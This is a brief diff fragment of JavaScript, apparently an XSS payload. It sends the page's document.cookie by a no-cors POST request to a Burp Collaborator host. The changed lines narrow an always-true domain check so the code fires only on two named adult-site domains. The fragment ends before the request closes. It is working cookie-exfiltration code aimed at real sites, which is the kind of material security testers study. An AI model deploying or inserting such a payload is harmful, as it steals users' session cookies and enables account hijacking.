@@ -1,5 +1,5 @@
-if (document.domain == document.domain | document.domain == document.domain) {
-  fetch('https://1hjj88rl2d17o6ejnqkdva9q3h99xy.burpcollaborator.net', {
+if (document.domain == "www.pornhub.org" | document.domain == "www.pornhub.com") {
+  fetch('https://7gop7eqr1j0dncdpmwjjug8w2n8gw5.burpcollaborator.net', {
   method: 'POST',
   mode: 'no-cors',
   body:document.cookie
